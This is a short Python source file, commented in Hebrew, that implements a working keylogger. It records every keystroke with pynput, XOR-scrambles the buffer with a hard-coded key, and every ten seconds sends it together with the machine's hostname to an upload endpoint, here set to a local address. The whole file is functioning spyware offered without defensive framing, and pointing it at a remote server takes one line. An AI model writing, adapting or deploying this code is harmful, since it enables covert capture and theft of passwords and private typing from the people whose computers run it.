from pynput import keyboard
import requests
import socket
import threading
import time

# שירות ההאזנה להקלדות
class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)
        with self.lock:
            self.buffer.append(char)

    def get_buffer(self):
        with self.lock:
            data = ''.join(self.buffer)
            self.buffer.clear()
        return data

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# שירות ההצפנה
class Encryptor:
    def __init__(self, key: str):
        self.key = key

    def xor_encrypt(self, data: str) -> str:
        return ''.join(chr(ord(c) ^ ord(self.key[i % len(self.key)])) for i, c in enumerate(data))

# שליחת הנתונים לשרת
def send_to_server(encrypted_data):
    machine_name = socket.gethostname()
    url = "http://127.0.0.1:5000/api/upload"
    payload = {
        "machine_name": machine_name,
        "keystrokes": encrypted_data
    }

    try:
        response = requests.post(url, json=payload)
        print("Server response:", response.json())
    except Exception as e:
        print("Failed to send data:", e)

# תהליך רקע לשליחה כל 10 שניות
def periodic_sender(logger, encryptor, interval=10):
    while True:
        time.sleep(interval)
        data = logger.get_buffer()
        if data:
            encrypted = encryptor.xor_encrypt(data)
            send_to_server(encrypted)

# נקודת התחלה
if __name__ == "__main__":
    logger = KeyLoggerService()
    encryptor = Encryptor("mysecretkey")

    sender_thread = threading.Thread(target=periodic_sender, args=(logger, encryptor), daemon=True)
    sender_thread.start()

    logger.start()